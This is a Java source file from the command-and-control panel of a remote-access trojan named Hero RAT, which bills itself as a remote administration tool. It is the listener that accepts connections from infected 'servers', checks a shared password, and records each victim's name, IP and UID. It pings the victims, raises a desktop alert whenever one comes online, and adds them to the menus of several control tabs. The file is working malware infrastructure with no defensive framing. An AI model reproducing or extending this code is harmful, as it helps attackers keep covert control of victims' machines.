package net.herorat.network;

import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.io.DataOutputStream;
import java.io.OutputStream;
import java.net.ServerSocket;
import java.net.Socket;
import java.util.Date;
import java.util.HashMap;

import javax.swing.ImageIcon;
import javax.swing.JOptionPane;
import javax.swing.Timer;

import net.herorat.Main;
import net.herorat.database.DBServers;
import net.herorat.features.ping.Ping;
import net.herorat.features.servers.Server;
import net.herorat.utils.Crypto;

import java.awt.Image;
import java.awt.SystemTray;
import java.awt.TrayIcon;
import java.awt.TrayIcon.MessageType;


public class Network extends Thread
{
	private int port;
	private String password;
	
	public static HashMap<String, Server> servers = new HashMap<String, Server>();
	
	private boolean isConnected;
	private Socket socket;
	private ServerSocket serverSocket;
	private long start_time;
	
	private Timer timer_refresh = new Timer(1000, new ActionListener() {
		public void actionPerformed(ActionEvent e)
		{
			Main.mainWindow.setTitle("Hero Rat - Remote Administration Tool - Online servers " + servers.size());
			
			Main.mainWindow.panel_tab1.label_online.setText("Online servers: " + servers.size());
			Main.mainWindow.panel_tab1.label_offline.setText("Offline servers: " + (DBServers.getCount() - servers.size()));
			Main.mainWindow.panel_tab1.label_total.setText("Total servers: " + DBServers.getCount());
			
			for (Server server : servers.values())
			{
				Ping.send(server);
				
				int row;
				for (row=0; row<Main.mainWindow.panel_tab2.model_servers.getRowCount(); row++)
				{
					if (Main.mainWindow.panel_tab2.model_servers.getValueAt(row, 6).equals(server.getUid())) break;
				}
				
				Main.mainWindow.panel_tab2.model_servers.setValueAt(server.getUptime(), row, 4);
				Main.mainWindow.panel_tab2.model_servers.setValueAt(server.getPing(), row, 5);
				Main.mainWindow.panel_tab2.model_servers.setValueAt(server.getComment(), row, 7);
			}
		}
	});
	
	
	public Network(int port, String password)
	{
		this.port = port;
		this.password = password;
		
		try
		{
			this.serverSocket = new ServerSocket(this.port);
			this.isConnected = true;
		}
		catch (Exception e)
		{
			e.printStackTrace();
		}
	}
	
	public static String[] getServerList(boolean all)
	{
		String[] list = new String[servers.keySet().size() + 1];
		if (all)
		{
			list[0] = "All";
		}
		else
		{
			list[0] = "Please select an user in the list";
		}
		
		int i = 1;
		Server server_tmp;
		for (String id : servers.keySet())
		{
			server_tmp = servers.get(id);
			list[i++] = server_tmp.getServerName() + " @ " + server_tmp.getIp() + " (UID: " + server_tmp.getUid().toUpperCase() + ")";
		}
		
		return list;
	}
	
	public static int getServerPositionInList(Server server)
	{
		int i = 1;
		for (String id : servers.keySet())
		{
			if (server != null && id != null && server.getUid().equals(id)) return i;
			i++;
		}
		
		return 0;
	}
	
	public static Server findWithCombo(String row)
	{
		if (row.indexOf("UID: ") > -1)
		{
			row = row.substring(row.indexOf("UID: ") + 5, row.length() - 1);
			return servers.get(row);
		}
		return null;
	}
	
	public static int getServersCount()
	{
		return servers.size();
	}
	
	public void disconnect()
	{
		timer_refresh.stop();
		Main.mainWindow.setTitle("Hero Rat - Remote Administration Tool");
		Main.mainWindow.panel_tab1.label_online.setText("Online servers: 0");
		Main.mainWindow.panel_tab1.label_offline.setText("Offline servers: " + DBServers.getCount());
		
		this.isConnected = false;
		try
		{
			if (this.serverSocket != null) this.serverSocket.close();
		}
		catch (Exception e)
		{
			e.printStackTrace();
		}
	}
	
	public void run()
	{
		start_time = new Date().getTime();
		timer_refresh.start();
		
		while (this.isConnected)
		{
			try
			{
				this.socket = this.serverSocket.accept();
				
				OutputStream output = this.socket.getOutputStream();
				DataOutputStream outputstream = new DataOutputStream(output);

				Server server = new Server(this.socket);
				if(server.isAuth(this.password))
				{
					servers.put(server.getUid(), server);
					server.setComment( DBServers.getComment(server.getUid()) );
					outputstream.writeUTF(Crypto.byteToHex(Crypto.crypt("ACCEPT_CONNECTION")));
					
					if (start_time + (2 * 60 * 1000) < new Date().getTime())
					{
						String message_content = server.getServerName() + " @ " + server.getIp() + " (UID: " + server.getUid().toUpperCase() + ") is now Online!";
						
						if(SystemTray.isSupported())
						{
							SystemTray tray = SystemTray.getSystemTray();
							ImageIcon imageIcon = new ImageIcon( getClass().getResource("/images/icon.png") );
							Image image = imageIcon.getImage();							
							TrayIcon trayIcon = new TrayIcon(image, "Hero RAT");
							tray.add(trayIcon);
							trayIcon.displayMessage("New server online", message_content, MessageType.INFO);
						}
						else
						{
							JOptionPane.showOptionDialog(null, message_content, "New server online", JOptionPane.DEFAULT_OPTION, JOptionPane.INFORMATION_MESSAGE, null, (Object[]) null, (Object) null);
						}
					}
					
					server.start();
					
					Main.mainWindow.panel_tab2.model_servers.addRow( server.getRowData() );
					Main.mainWindow.panel_tab3.combo_select.addItem(server.getServerName() + " @ " + server.getIp() + " (UID: " + server.getUid().toUpperCase() + ")");
					Main.mainWindow.panel_tab4.combo_select.addItem(server.getServerName() + " @ " + server.getIp() + " (UID: " + server.getUid().toUpperCase() + ")");
					Main.mainWindow.panel_tab5.combo_select.addItem(server.getServerName() + " @ " + server.getIp() + " (UID: " + server.getUid().toUpperCase() + ")");
					Main.mainWindow.panel_tab6.combo_select.addItem(server.getServerName() + " @ " + server.getIp() + " (UID: " + server.getUid().toUpperCase() + ")");
					Main.mainWindow.panel_tab7.combo_select.addItem(server.getServerName() + " @ " + server.getIp() + " (UID: " + server.getUid().toUpperCase() + ")");
					Main.mainWindow.panel_tab8.combo_select.addItem(server.getServerName() + " @ " + server.getIp() + " (UID: " + server.getUid().toUpperCase() + ")");
					Main.mainWindow.panel_tab9.combo_select.addItem(server.getServerName() + " @ " + server.getIp() + " (UID: " + server.getUid().toUpperCase() + ")");
					Main.mainWindow.panel_tab10.combo_select.addItem(server.getServerName() + " @ " + server.getIp() + " (UID: " + server.getUid().toUpperCase() + ")");
					Main.mainWindow.panel_tab11.combo_select.addItem(server.getServerName() + " @ " + server.getIp() + " (UID: " + server.getUid().toUpperCase() + ")");
				}
				else
				{
					server.disconnect();
				}
			}
			catch (Exception e) {}
		}
	}
}
